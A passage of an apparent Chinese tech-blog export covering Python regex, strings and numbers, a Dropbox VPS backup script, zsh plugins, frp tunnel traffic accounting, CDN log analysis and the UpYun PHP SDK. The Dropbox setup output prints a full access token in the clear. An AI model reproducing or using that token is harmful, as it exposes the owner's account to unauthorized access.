[&apos;python&apos;, &apos;python&apos;, &apos;java&apos;, &apos;java&apos;, &apos;pt&apos;, &apos;php&apos;, &apos;php&apos;] &gt;&gt;&gt;9、匹配数字和字母 \\w 表示匹配所有字符 \\d 表示匹配数字 &gt;&gt;&gt; print re.findall(r&apos;p\\w+\\d+&apos;,text) [&apos;python2&apos;, &apos;python3&apos;, &apos;php4&apos;, &apos;php7&apos;]10、 “\\b” 单词边界，表示出现在单词的开头 &gt;&gt;&gt; print re.findall(r&apos;p[^0-9]\\b&apos;,text) [&apos;pt&apos;] &gt;&gt;&gt; print re.findall(r&apos;\\bp[^0-9]+&apos;,text) [&apos;python&apos;, &apos;python&apos;, &apos;php&apos;, &apos;php&apos;]贪婪模式和非贪婪模式“*” 和”+” 都是尽可能匹配到越多越好，如果加？就是匹配的尽可能少 &gt;&gt;&gt; print re.findall(r&apos;p[a-z]*&apos;,text) [&apos;python&apos;, &apos;python&apos;, &apos;pt&apos;, &apos;php&apos;, &apos;php&apos;] &gt;&gt;&gt; print re.findall(r&apos;p[a-z]*?&apos;,text) [&apos;p&apos;, &apos;p&apos;, &apos;p&apos;, &apos;p&apos;, &apos;p&apos;, &apos;p&apos;, &apos;p&apos;] &gt;&gt;&gt; print re.findall(r&apos;p[a-z]+?&apos;,text) [&apos;py&apos;, &apos;py&apos;, &apos;pt&apos;, &apos;ph&apos;, &apos;ph&apos;] &gt;&gt;&gt; print re.findall(r&apos;p[a-z]+\\b&apos;,text) [&apos;pt&apos;] &gt;&gt;&gt; print re.findall(r&apos;p[a-z]+?\\b&apos;,text) [&apos;pt&apos;]分组根据字母和数字分组 &gt;&gt;&gt; a = re.search(r&apos;(p[a-zA-Z]+)([0-9])&apos;,&apos;python2&apos;) &gt;&gt;&gt; print a.group(1) python &gt;&gt;&gt; print a.group(2) 2设置分组名称 &gt;&gt;&gt; a = re.search(r&apos;(?P&lt;name&gt;p[a-zA-z]+)(?P&lt;version&gt;[0-9])&apos;,&apos;python2&apos;) &gt;&gt;&gt; print a.group(&apos;name&apos;) python &gt;&gt;&gt; print a.group(&apos;version&apos;) 2pattern&gt;&gt;&gt; pattern = re.compile(r&apos;(?P&lt;name&gt;p[a-zA-z]+)(?P&lt;version&gt;[0-9])&apos;) &gt;&gt;&gt; results = pattern.search(&apos;python2&apos;) &gt;&gt;&gt; print results.groupdict() {&apos;version&apos;: &apos;2&apos;, &apos;name&apos;: &apos;python&apos;} &gt;&gt;&gt; results = pattern.search(&apos;python3&apos;) &gt;&gt;&gt; print results.groupdict() {&apos;version&apos;: &apos;3&apos;, &apos;name&apos;: &apos;python&apos;} &gt;&gt;&gt; results = pattern.search(&apos;php3&apos;) &gt;&gt;&gt; print results.groupdict() {&apos;version&apos;: &apos;3&apos;, &apos;name&apos;: &apos;php&apos;}for循环 &gt;&gt;&gt; for t in text.split(&apos; &apos;): ... results = pattern.search(t) ... if results: ... print results.groupdict() ... {&apos;version&apos;: &apos;2&apos;, &apos;name&apos;: &apos;python&apos;} {&apos;version&apos;: &apos;3&apos;, &apos;name&apos;: &apos;python&apos;} {&apos;version&apos;: &apos;4&apos;, &apos;name&apos;: &apos;php&apos;} {&apos;version&apos;: &apos;7&apos;, &apos;name&apos;: &apos;php&apos;} &gt;&gt;&gt;写规则A. &gt;&gt;&gt; a = re.compile(r&quot;&quot;&quot;\\d + $ 整数部分 ... \\. # 小数点 ... \\d * #小数部分 ... &quot;&quot;&quot;,re.X) &gt;&gt;&gt;B. &gt;&gt;&gt; b = re.compile(r&quot;\\d+\\.\\d*&quot;) &gt;&gt;&gt;A 和 B 其实是一个意思，但是 A 看起来更直观。 正则表达式参考https://awen.me/post/2907850497.html","categories":[],"tags":[{"name":"python","slug":"python","permalink":"https://awen.me/tags/python/"}]},{"title":"基础:Python 字符串","slug":"基础-Python-字符串","date":"2017-09-06T01:21:10.000Z","updated":"2021-02-26T06:05:29.322Z","comments":true,"path":"posts/55876.html","link":"","permalink":"https://awen.me/posts/55876.html","excerpt":"字符串切片、索引","text":"字符串切片、索引 &gt;&gt;&gt; s =&quot;use python do something&quot; &gt;&gt;&gt; s[1] # 获取第一个下标的元素，默认从0开始 &apos;s&apos; &gt;&gt;&gt; s[-1] #获取最后一个下标的元素 &apos;g&apos; &gt;&gt;&gt; s[1:3] #获取1到3下标的元素 &apos;se&apos; &gt;&gt;&gt; s[1:6:2] # 获取1-6下标的元素，每2个小标获取一次 &apos;s y&apos; &gt;&gt;&gt; s[1:] #获取1到最后的下标对应元素 &apos;se python do something&apos; &gt;&gt;&gt; s[:-1] #获取开始到倒数第一前的元素 &apos;use python do somethin&apos; &gt;&gt;&gt; s[:] #获取所有下标元素 &apos;use python do something&apos; &gt;&gt;&gt;常用的方法集合1.组合 &gt;&gt;&gt; &quot;let us &quot;+s &apos;let us use python do something&apos;2.乘法 &gt;&gt;&gt; s*2 &apos;use python do somethinguse python do something&apos;3.大写 &gt;&gt;&gt; s.upper() &apos;USE PYTHON DO SOMETHING&apos;4.查找字符串索引 &gt;&gt;&gt; s.find(&apos;pa&apos;) -1 &gt;&gt;&gt; s.find(&apos;p&apos;) 45.替换 &gt;&gt;&gt; s.replace(&apos;python&apos;,&apos;java&apos;) &apos;use java do something&apos;6.字符串格式化 &gt;&gt;&gt; print &quot;%s like %s&quot; %(&apos;we&apos;,&apos;python&apos;) we like python转义我们看下这个 &gt;&gt;&gt; s = &quot;C:\\newpyton&quot; &gt;&gt;&gt; print s C: ewpyton &gt;&gt;&gt; len(s) 10然后对照下这个 &gt;&gt;&gt; d = &quot;C:\\\\newpyton&quot; &gt;&gt;&gt; print d C:\\newpyton &gt;&gt;&gt; len(s) 10 会发现长度都是一样的，但是显示的却不一样 第一个从 C: 后面跟个换行符，他把\\n 当成了换行符。 unicode&gt;&gt;&gt; u&apos;中文&apos; u&apos;\\u4e2d\\u6587&apos;通常在 Python 文件开头要设置字符集 #-*-coding:utf-8-*-","categories":[],"tags":[{"name":"python","slug":"python","permalink":"https://awen.me/tags/python/"}]},{"title":"基础:Python 数字类型变量","slug":"基础-Python-数字类型变量","date":"2017-09-04T07:49:41.000Z","updated":"2021-02-26T06:05:29.322Z","comments":true,"path":"posts/4951.html","link":"","permalink":"https://awen.me/posts/4951.html","excerpt":"温故而知新Python 可以自动转换类型，我们称之为动态类型，本文主要是介绍数字类型的变量和方法。","text":"温故而知新Python 可以自动转换类型，我们称之为动态类型，本文主要是介绍数字类型的变量和方法。 ➜ www python Python 2.7.13 (v2.7.13:a06454b1afa1, Dec 17 2016, 12:39:47) [GCC 4.2.1 (Apple Inc. build 5666) (dot 3)] on darwin Type &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information. &gt;&gt;&gt; a=34 &gt;&gt;&gt; type(a) # a 是 init 型 &lt;type &apos;int&apos;&gt; &gt;&gt;&gt; a=3.4 &gt;&gt;&gt; type(a) # a 是 float 型 &lt;type &apos;float&apos;&gt; &gt;&gt;&gt; 0.3*3 # 会丢失精度 0.8999999999999999 &gt;&gt;&gt; print 0.3*3 # print 会把结果人性化的显示 0.9 &gt;&gt;&gt; 0.3/3 0.09999999999999999 &gt;&gt;&gt; print 0.3/3 0.1 &gt;&gt;&gt; from decimal import Decimal as D #调用 decimal 来解决精度问题 &gt;&gt;&gt; D(&apos;0.3&apos;)*D(3) Decimal(&apos;0.9&apos;) &gt;&gt;&gt; print D(&apos;0.3&apos;)*D(3) 0.9 &gt;&gt;&gt; D(&apos;0.3&apos;)/D(3) Decimal(&apos;0.1&apos;) &gt;&gt;&gt; print D(&apos;0.3&apos;)/D(3) 0.1其中from decimal import Decimal as D 是指调用 decimal 库并把 decimal 设置为别名 D &gt;&gt;&gt; 1/2**10000 # 数字太大无法显示 0L &gt;&gt;&gt; 1.0/2**10000 #直接报错了 Traceback (most recent call last): File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt; OverflowError: long int too large to convert to float &gt;&gt;&gt;要表示1的10000次方 &gt;&gt;&gt; D(1)/D(2**10000) Decimal(&apos;5.012372749206452009297555934E-3011&apos;)decimal 的缺点就是执行时间比 float 长 ➜ www python -mtimeit -s &quot;from decimal import Decimal as D&quot; &quot;D(&apos;1.2&apos;)+D(&apos;3.4&apos;)&quot; 10000 loops, best of 3: 24.7 usec per loop # decimal 的时间最长 ➜ www python -mtimeit -s &quot;from decimal import Decimal as D&quot; &quot;1.2+3.4&quot; 100000000 loops, best of 3: 0.0157 usec per loop #两个 float 直接相加时间最段 ➜ www python -mtimeit -s &quot;from decimal import Decimal as D&quot; &quot;float(&apos;1.2&apos;)+float(&apos;3.4&apos;)&quot; 1000000 loops, best of 3: 0.338 usec per loop # 加了字符串转换也会增加时间和数字相关的库1.math &gt;&gt;&gt; import math &gt;&gt;&gt; math.pi 3.141592653589793 &gt;&gt;&gt; math.sqrt(80) 8.94427190999916 &gt;&gt;&gt; math.log10(2**1000) 301.0299956639812 &gt;&gt;&gt; math.pow(1,5) 1.0 &gt;&gt;&gt; math.factorial(5) 1202.random &gt;&gt;&gt; import random &gt;&gt;&gt; random.random() 0.1797989878351397 &gt;&gt;&gt; random.choice([1,2,3]) 2 &gt;&gt;&gt; random.randint(2,5) 2 &gt;&gt;&gt; random.uniform(4,5) 4.374124742261563 &gt;&gt;&gt; random.gauss(2,34) 87.840620047354563.dir &gt;&gt;&gt; dir(math) [&apos;__doc__&apos;, &apos;__file__&apos;, &apos;__name__&apos;, &apos;__package__&apos;, &apos;acos&apos;, &apos;acosh&apos;, &apos;asin&apos;, &apos;asinh&apos;, &apos;atan&apos;, &apos;atan2&apos;, &apos;atanh&apos;, &apos;ceil&apos;, &apos;copysign&apos;, &apos;cos&apos;, &apos;cosh&apos;, &apos;degrees&apos;, &apos;e&apos;, &apos;erf&apos;, &apos;erfc&apos;, &apos;exp&apos;, &apos;expm1&apos;, &apos;fabs&apos;, &apos;factorial&apos;, &apos;floor&apos;, &apos;fmod&apos;, &apos;frexp&apos;, &apos;fsum&apos;, &apos;gamma&apos;, &apos;hypot&apos;, &apos;isinf&apos;, &apos;isnan&apos;, &apos;ldexp&apos;, &apos;lgamma&apos;, &apos;log&apos;, &apos;log10&apos;, &apos;log1p&apos;, &apos;modf&apos;, &apos;pi&apos;, &apos;pow&apos;, &apos;radians&apos;, &apos;sin&apos;, &apos;sinh&apos;, &apos;sqrt&apos;, &apos;tan&apos;, &apos;tanh&apos;, &apos;trunc&apos;]4.help &gt;&gt;&gt; help(math)random.random()可以生成一个0-1之间的随机数，比如说我们希望产生一个概率中奖概率20%，那么可以random.random()&gt;0.8 当他是 true 就是中奖了，否则没中奖。 &gt;&gt;&gt; random.random() 0.6586755279600274 &gt;&gt;&gt; random.random() 0.7146088640324266 &gt;&gt;&gt; random.random() 0.9007269952467781 &gt;&gt;&gt; random.random() 0.9163585110005992 &gt;&gt;&gt; random.random()&gt;0.8 False &gt;&gt;&gt; random.random()&gt;0.8 False &gt;&gt;&gt; random.random()&gt;0.8 False &gt;&gt;&gt; random.random()&gt;0.8 False &gt;&gt;&gt; random.random()&gt;0.8 False &gt;&gt;&gt; random.random()&gt;0.8 False &gt;&gt;&gt; random.random()&gt;0.8 False &gt;&gt;&gt; random.random()&gt;0.8 True &gt;&gt;&gt; random.random()&gt;0.8 False &gt;&gt;&gt; random.random()&gt;0.8 False &gt;&gt;&gt; random.random()&gt;0.8 False &gt;&gt;&gt; random.random()&gt;0.8 True &gt;&gt;&gt; random.random()&gt;0.8 False &gt;&gt;&gt; random.random()&gt;0.8 True &gt;&gt;&gt; random.random()&gt;0.8 True &gt;&gt;&gt;科学计算1.numpy 产生数组和矩阵，正态分布的随机数，矩阵运算，举证求逆，转置等操作2.scipy 拟合，线性插值，样条插值，积分，微分，触非线性方程，滤波器设计","categories":[],"tags":[{"name":"python","slug":"python","permalink":"https://awen.me/tags/python/"}]},{"title":"利用 dropbox 备份网站","slug":"利用-dropbox-备份网站","date":"2017-09-02T23:34:10.000Z","updated":"2021-02-26T06:05:29.317Z","comments":true,"path":"posts/42711.html","link":"","permalink":"https://awen.me/posts/42711.html","excerpt":"这篇文章主要讲解如何使用 Dropbox 在 Linux 上进行文件备份。需要声明一点的是该方案只适合 vps 在国外的用户使用，因为 Dropbox 在国内被墙该方案无法使用。","text":"这篇文章主要讲解如何使用 Dropbox 在 Linux 上进行文件备份。需要声明一点的是该方案只适合 vps 在国外的用户使用，因为 Dropbox 在国内被墙该方案无法使用。 配置应用密钥登录Dropbox后，打开Apps页面，点击 Create App 按钮，创建一个App。安装下图操作： 点击 create app 按钮 创建一个 app 选择 Dropbox api 然后其他的根据如图所示配置，最后输入 app 名称 点击创建后复制 App secret的值，需要点击Generated access token的按钮生成 token，然后复制该值 下载脚本1.下载脚本 wget https://raw.github.com/andreafabrizi/Dropbox-Uploader/master/dropbox_uploader.sh 2.然后我们把脚本放到/usr/local/bin 目录去 mv dropbox_uploader.sh /usr/local/bin/dropbox_uploader chmod +x /usr/local/bin/dropbox_uploader3.配置 drpobox，执行如下命令然后输入密钥值就可以绑定到 app dropbox_uploader info 如 [root@aliyun ~]# dropbox_uploader info This is the first time you run this script, please follow the instructions: 1) Open the following URL in your Browser, and log in using your account: https://www.dropbox.com/developers/apps 2) Click on &quot;Create App&quot;, then select &quot;Dropbox API app&quot; 3) Now go on with the configuration, choosing the app permissions and access restrictions to your DropBox folder 4) Enter the &quot;App Name&quot; that you prefer (e.g. MyUploader120623263730051) Now, click on the &quot;Create App&quot; button. When your new App is successfully created, please click on the Generate button under the &apos;Generated access token&apos; section, then copy and paste the new access token here: # Access token: Y5s0FzVaOFAAAAAAAAAG5J-2Wwsbn74fPd4Q_OUygtWXs2wtTW40iZgL75ddO9oU &gt; The access token is Y5s0FzVaOFAAAAAAAAAG5J-2Wwsbn74fPd4Q_OUygtWXs2wtTW40iZgL75ddO9oU. Looks ok? [y/N]: y The configuration has been saved.5.然后执行下面的命令上传一个文件 如果 ok 说明没问题 dropbox_uploader upload frp_0.13.0_linux_amd64.tar.gz frp_0.13.0_linux_amd64.tar.gz备份脚本#!/bin/bash SCRIPT_DIR=&quot;/usr/local/bin&quot; #这个改成你存放刚刚下载下来的dropbox_uploader.sh的文件夹位置 DROPBOX_DIR=&quot;/backup&quot; #这个改成你的备份文件想要放在Dropbox下面的文件夹名称，如果不存在，脚本会自动创建 BACKUP_SRC=&quot;/www /usr/local/openresty/ /root/.acme.sh/&quot; #这个是你想要备份的本地VPS上的文件，不同的目录用空格分开 BACKUP_DST=&quot;/tmp&quot; #这个是你暂时存放备份压缩文件的地方，一般用/tmp即可 # 下面的一般不用改了 NOW=$(date +&quot;%Y.%m.%d&quot;) DESTFILE=&quot;$BACKUP_DST/$NOW.tar.gz&quot; echo &quot;正在打包文件&quot; tar cfzP &quot;$DESTFILE&quot; $BACKUP_SRC echo &quot;所有数据打包完成，准备上传...&quot; # 用脚本上传到dropbox $SCRIPT_DIR/dropbox_uploader upload &quot;$DESTFILE&quot; &quot;$DROPBOX_DIR/$NOW.tar.gz&quot; if [ $? -eq 0 ];then echo &quot;上传完成&quot; else echo &quot;上传失败，重新尝试&quot; fi # 删除本地的临时文件 rm -f &quot;$NOW-Databases.sql&quot; &quot;$DESTFILE&quot;配置计划任务crontab -e加一条 0 3 * * * /bin/bash /usr/local/bin/backupok，到此搞定了备份!","categories":[],"tags":[{"name":"Dropbox","slug":"Dropbox","permalink":"https://awen.me/tags/Dropbox/"}]},{"title":"为 zsh 实现 fish shell 的效果","slug":"为-zsh-实现-fish-shell-的效果","date":"2017-09-02T02:51:37.000Z","updated":"2021-02-26T06:05:29.296Z","comments":true,"path":"posts/64580.html","link":"","permalink":"https://awen.me/posts/64580.html","excerpt":"在 mac 上我一直用 zsh，不过我发现了 fish shell，被他的一个功能给吸引了，他的智能提示功能非常好用，我们看下效果 他会自动从你的历史命令记录中找到与你输入的命令匹配的显示出来，然后你如果确定是这条，就直接 ctrl+e 跳到行尾这条命令就算输入完了，是不是很厉害。不过fish 的语法和 bash 不兼容，我写的 shell 脚本无法运行，不能仅仅因为他的这个功能我就要重新去学他的语法。这成本太高。但是这个功能确实能够大大提升工作效率，怎么办呢？于是 google github 找到了一个zsh 的插件。","text":"在 mac 上我一直用 zsh，不过我发现了 fish shell，被他的一个功能给吸引了，他的智能提示功能非常好用，我们看下效果 他会自动从你的历史命令记录中找到与你输入的命令匹配的显示出来，然后你如果确定是这条，就直接 ctrl+e 跳到行尾这条命令就算输入完了，是不是很厉害。不过fish 的语法和 bash 不兼容，我写的 shell 脚本无法运行，不能仅仅因为他的这个功能我就要重新去学他的语法。这成本太高。但是这个功能确实能够大大提升工作效率，怎么办呢？于是 google github 找到了一个zsh 的插件。 zsh-users在github 发现了一个项目叫 zsh-users 上面的介绍说是：Zsh community projects，感觉是非官方的项目。 里面有两个插件： zsh-autosuggestions git clone git://github.com/zsh-users/zsh-autosuggestions ~/.zsh/zsh-autosuggestions source ~/.zsh/zsh-autosuggestions/zsh-autosuggestions.zshzsh-syntax-highlighting git clone https://github.com/zsh-users/zsh-syntax-highlighting.git echo &quot;source ${(q-)PWD}/zsh-syntax-highlighting/zsh-syntax-highlighting.zsh&quot; &gt;&gt; ${ZDOTDIR:-$HOME}/.zshrc source ./zsh-syntax-highlighting/zsh-syntax-highlighting.zsh安装起来非常简单，clone到$ZSH_CUSTOM/plugins目录，然后在.zshrc文件正配置一下即可。 最终效果就是如开始的那样，你可以试试哦！","categories":[],"tags":[{"name":"zsh","slug":"zsh","permalink":"https://awen.me/tags/zsh/"}]},{"title":"科普:什么是上行流量什么是下行流量","slug":"科普-什么是上行流量什么是下行流量","date":"2017-09-01T11:37:20.000Z","updated":"2021-02-26T06:05:29.348Z","comments":true,"path":"posts/27335.html","link":"","permalink":"https://awen.me/posts/27335.html","excerpt":"今天部门同事问了个非常基础的网络问题，什么是上行流量，什么是上行流量。听同事在讨论，我觉得我这个伪网工实在看不下去了，不过他的问题说起来比这个要稍微复杂一点点，于是就有点搞不懂到底是怎么算上行和下行。","text":"今天部门同事问了个非常基础的网络问题，什么是上行流量，什么是上行流量。听同事在讨论，我觉得我这个伪网工实在看不下去了，不过他的问题说起来比这个要稍微复杂一点点，于是就有点搞不懂到底是怎么算上行和下行。 我之前给同事分享过一个穿透内网的工具，叫 frp，可以把你的内网某个设备的端口映射到一台公网的机器上，然后你访问公网的某个端口就相当于访问了内网的机器。他的问题是如果我现在通过这个端口远程到内网的机器去下载文件，这个流量是算这台公网的机器的还是算内网的机器。比如我本机 SSH 到公网的22端口，实际是连接到内网的那个机器的22端口，然后我在内网的机器上下载文件。这个流量是算哪个机器的。对于公网的机器来说这个流量是算上行还是下行。 要知道这个问题的答案，我们首先要知道网卡是干什么吃的？网卡的功能其实就2个，收数据和发数据，对应的 RX 和 TX 表示。 通过 Linux 的 iftop 命令我们可以很直观的看到数据包的发送和接收的实时信息，当然 ifconfig 也可以看，只是我个人习惯用 iftop iftop -i interface 那么我们就用事实说话，看看这个流量到底是算内网的机器的还是算公网的机器的，我们准备一台内网的机器，并且安装 frp 和配置 这里我在内网的 Windows 中安装一个 linux 系统。然后在我的 mac 远程过去 我们先在内网的 linux 上开启 frp 然后我在本机远程 ➜ Downloads ssh root@121.42.14.64 -p 65423 The authenticity of host &apos;[121.42.14.64]:65423 ([121.42.14.64]:65423)&apos; can&apos;t be established. ECDSA key fingerprint is SHA256:a/CERDy7adLz7mgkB//4oZIseFElz/aOJ8SvhdkTWaM. Are you sure you want to continue connecting (yes/no)? yes Warning: Permanently added &apos;[121.42.14.64]:65423&apos; (ECDSA) to the list of known hosts. Last login: Fri Sep 1 08:46:01 2017 from adsl-172-10-100-1.dsl.hstntx.sbcglobal.net [root@elk ~]# [root@elk ~]# [root@elk ~]#同时我们在阿里云的机器上开启一个终端执行 [root@aliyun ~]# iftop -i eth1然后我们返回连接到的内网机器，下载一个文件 然后切换到阿里云的终端观察，我大概等了有5分钟，此时这个文件已经下载了8%，总大小4.1G [root@elk ~]# wget -c http://mirrors.163.com/centos/7.3.1611/isos/x86_64/CentOS-7-x86_64-DVD-1611.iso --2017-09-01 08:52:11-- http://mirrors.163.com/centos/7.3.1611/isos/x86_64/CentOS-7-x86_64-DVD-1611.iso Resolving mirrors.163.com (mirrors.163.com)... 123.58.190.209, 123.58.190.236, 123.58.190.234, ... Connecting to mirrors.163.com (mirrors.163.com)|123.58.190.209|:80... connected. HTTP request sent, awaiting response... 200 OK Length: 4379901952 (4.1G) [application/octet-stream] Saving to: ‘CentOS-7-x86_64-DVD-1611.iso’ 8% [======&gt; ] 389,358,141 1.01MB/s eta 40m 58s 然后我们返回阿里云的设备，此时的终端我们看不管是收和发总共也才几百 k的 这是为什么呢？ 因为我 SSH 连接到内网的 Linux 主机只是和主机的 SSH 协议对应的端口建立了连接，而下载的是内网的机器和网易开源镜像站建立了连接，这和阿里云半毛钱关系都没有。 同时，通信是双方的，虽然中间数据包会经过很多个路由，但是目标IP 和端口只有一个，不会牵扯到第三个人，不管是 TCP 协议还是 UDP 协议都有源IP 目标 IP 源端口和目标端口。 从上面的例子中我们可以看出，我本机和阿里云的65423端口建立了连接，而阿里云服务器的 frp程序的7000端口和我内网的设备建立了连接 [root@elk ~]# ss -ant| grep 121.42.14.64 ESTAB 0 44 192.168.1.111:36080 121.42.14.64:7000而内网在调用 wget 去下载的时候又会和网易的服务器去建立连接，所以这就解释了这个流量到底是算谁的这个问题。 同时在科普下本文的主题，如何判断上行和下行流量。 网卡有收和发2个功能，你从其他服务器获取数据，这叫下载，是下行流量，反之，你本机向某个服务器发送数据，比如 FTP 上传、HTTP POST 或 PUT 数据 这叫发，也就是上传，上行流量。不知道是不是看明白啦！ 那么 Windows 电脑 打开网络连接可以看到收和发的数据包字节总数 Linux 的 ifconfig [root@aliyun ~]# ifconfig eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt; mtu 1500 inet 10.169.22.37 netmask 255.255.248.0 broadcast 10.169.23.255 ether 00:16:3e:00:05:11 txqueuelen 1000 (Ethernet) RX packets 11 bytes 1340 (1.3 KiB) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 38 bytes 2480 (2.4 KiB) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 eth1: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt; mtu 1500 inet 121.42.14.64 netmask 255.255.252.0 broadcast 121.42.15.255 ether 00:16:3e:00:29:6d txqueuelen 1000 (Ethernet) RX packets 1172482 bytes 1430753982 (1.3 GiB) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 617708 bytes 817228882 (779.3 MiB) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt; mtu 65536 inet 127.0.0.1 netmask 255.0.0.0 loop txqueuelen 1 (Local Loopback) RX packets 5028 bytes 406494 (396.9 KiB) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 5028 bytes 406494 (396.9 KiB) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0解答1.内网流量算上行还是下行？ 这个和内网外网没关系，和设备的网卡有关系，每一块网卡都可以收发数据，比如你从连接内网的网卡出去到某个内网的机器下载东西，这个流量就算是内网网卡的下行数据,如果你通过内网的网卡向局域网的某个设备上传文件就是上行。 2.比如我映射内网的80到公网的8080端口，然后我在本地访问公网的8080端口下载文件，这个流量算谁的，是上行还是下行？ 我在内网放了一个600多 M 的文件，然后按照上面的方式进行映射，本地下载，观察流量变化，你发现公网机器上收和发的流量几乎差不多。 按照之前说的,我们来分析下为什么会这样： 我本机和服务器的8080端口建立连接，去请求数据，对于我本机来说是下载数据。 对于服务器而言是发数据，是服务器向我本机发送数据，是一个上传的过程。 而服务器和内网机器之间建立连接，是服务器从内网机器的80端口去获取数据，是收数据,而内网的机器则是向公网机器的8080端口发送数据，下图是内网机器的收发数据截图 所以通过 frp 这种内网工具对于公网的设备而言是双向的哦。 3.比如某个节点10g带宽，这个10g 带宽是指上行还是下行 这个要问购买这个节点带宽的人咯，这个到底是上行下行都是 10G，还是只是上行10G，比如说对于我阿里云的服务器来说，2M 带宽，这个带宽是指上行速度2M。 好啦！本期话题到此为止，希望能对你有所帮助。","categories":[],"tags":[{"name":"网络","slug":"网络","permalink":"https://awen.me/tags/%E7%BD%91%E7%BB%9C/"}]},{"title":"统计日志中包含动态请求的top 10","slug":"统计日志中包含动态请求的top-10","date":"2017-09-01T01:46:48.000Z","updated":"2021-02-26T06:05:29.352Z","comments":true,"path":"posts/32712.html","link":"","permalink":"https://awen.me/posts/32712.html","excerpt":"要统计 top 10 的动态请求，需要先去又拍云官网下载对应日期的全部日志，然后进行分析统计，具体操作步骤如下，其他需要也是类似的方法。","text":"要统计 top 10 的动态请求，需要先去又拍云官网下载对应日期的全部日志，然后进行分析统计，具体操作步骤如下，其他需要也是类似的方法。 下载日志后台点击工具箱–日志管理，切换到日志下载，选择对应的服务名和域名，然后选择 CDN 日志，然后选择日期，又拍云的日志是每小时一次，如果要统计比如 8月27号的日志，则选择8月27号，会在列表中看到当天所有的日志内容，格式是 gz 结尾 我们可以看下又怕云的日志格式相关解释 日志格式说明 $remote_addr - $remote_user [$time_local] &quot;$request_method $scheme://$http_host$uri$querystring $server_protocol&quot; $status $body_bytes_sent &quot;$http_referer&quot; &quot;$http_user_agent&quot; $content_type $request_content_length $cache_hit $source_code $is_dynamic $cache_control $request_time $edge_server_ip 其中is_dynamic自动对应的值是 Dynamic 这个值表示是动态请求，在又拍云 age 值小于60秒的请求都算是动态请求。 因为都是 gz 文件，我们可以用 gzcat 查看文件内容然后过滤包含有这个字段的行重定向到文本文件中去进一步分析 gzcat *.gz | grep Dynamic &gt; lentop1.log然后执行如下命令把日志文件中的 url 提取出来进行统计排序 ➜ Downloads cat lentop1.log|awk &apos;{print $7}&apos; |sort| uniq -c | sort -r 262 http://cdn.app.lentop1.top/upload/201708/15/app/20170815141007281.apk 145 http://cdn.app.lentop1.top/ 100 http://cdn.app.lentop1.top/upload/201708/16/app/20170816092711747.apk 100 http://cdn.app.lentop1.top/upload/201708/14/app/20170814180201495.apk 77 http://cdn.app.lentop1.top/upload/201708/15/app/20170815170549783.apk&amp;crazycache=1 34 http://cdn.app.lentop1.top/upload/201708/4/app/20170804115852117.apk 24 http://cdn.app.lentop1.top/upload/201708/11/app/20170811174923100.apk 14 http://cdn.app.lentop1.top/upload/201708/21/app/20170821134911165.apk 10 http://cdn.app.lentop1.top/upload/201708/11/app/20170811171347114.apk 8 http://cdn.app.lentop1.top/upload/201708/10/app/20170810115252167.apk 7 http://cdn.app.lentop1.top/upload/201708/10/app/20170810165546633.apk 5 http://cdn.app.lentop1.top/upload/201708/11/app/20170811141526830.apk 3 http://cdn.app.lentop1.top/upload/201708/22/app/20170822165039485.apk 1 http://cdn.app.lentop1.top/upload/201708/16/app/20170816170517229.apk 1 http://cdn.app.lentop1.top/upload/201708/10/app/20170810163123092.apk 1 http://cdn.app.lentop1.top/upload/201708/10/app/20170810161053871.apk 1 http://cdn.app.lentop1.top/upload/201708/10/app/20170810113054109.apk","categories":[],"tags":[{"name":"又拍云","slug":"又拍云","permalink":"https://awen.me/tags/%E5%8F%88%E6%8B%8D%E4%BA%91/"}]},{"title":"使用又拍云的 PHP SDK","slug":"使用又拍云的-PHP-SDK","date":"2017-08-31T23:34:45.000Z","updated":"2021-02-26T06:05:29.311Z","comments":true,"path":"posts/30426.html","link":"","permalink":"https://awen.me/posts/30426.html","excerpt":"又拍云的 PHP SDK 是根据又拍云的云存储和云处理文档来实现的，功能丰富，可以节省自己看文档一点点编码的时间，下面我们就一起来看下如何去使用它完成文件的上传。","text":"又拍云的 PHP SDK 是根据又拍云的云存储和云处理文档来实现的，功能丰富，可以节省自己看文档一点点编码的时间，下面我们就一起来看下如何去使用它完成文件的上传。 下载 sdk1.打开 http://docs.upyun.com/download/ 找到 SDK&amp;工具，点击 PHP SDK 的 github 按钮，或者直接访问https://github.com/upyun/php-sdk根据 GitHub 的说明安装 SDK 即可。从2.2.0版本开始支持了 composer，本文主要介绍如何使用 composer 进行安装 安装 composer1.打开命令行并依次执行下列命令安装最新版本的 Composer： php -r &quot;copy(&apos;https://install.phpcomposer.com/installer&apos;, &apos;composer-setup.php&apos;);&quot; php composer-setup.php php -r &quot;unlink(&apos;composer-setup.php&apos;);&quot; sudo mv composer.phar /usr/local/bin/composer这部分内容参考https://pkg.phpcomposer.com/#how-to-install-composer 安装 sdk1.安装完 composer，直接在你项目中运行以下命令即可 composer require upyun/sdk2.如果你不想安装 composer，可以下载源码包(注意需要下载 php-sdk-版本号.zip 格式的 zip 压缩包，不是 Source code 源码压缩包)，解压后，项目中添加如下代码： require_once &apos;/path/to/php-sdk/vendor/autoload.php&apos;; 初始化require_once(&apos;vendor/autoload.php&apos;); // 只针对使用 composer 安装 // require_once &apos;/path/to/php-sdk/vendor/autoload.php&apos;; // 针对压缩包安装 use Upyun\\Upyun; use Upyun\\Config; $serviceConfig = new Config(&apos;yourServiceName&apos;, &apos;yourOperatorName&apos;, &apos;yourOperatorPwd&apos;); $client = new Upyun($serviceConfig);上传文件1.文件流写入 $file = fopen(&apos;/local/path/file&apos;, &apos;r&apos;); $client-&gt;write(&apos;/save/path&apos;, $file);2.上传图片并转换格式为 PNG，其他的图片处理可以参考文档 $file = fopen(&apos;/local/path/image.jpg!awen)&apos;, &apos;r&apos;); $client-&gt;write(&apos;/save/image.png&apos;, $file, array(&apos;x-gmkerl-thumb&apos; =&gt; &apos;/format/png&apos;));下载文件$saveLocal = fopen(&apos;/local/path/image.jpg!awen)&apos;, &apos;w&apos;); // 第二个参数不传时，read 方法将直接返回文件内容 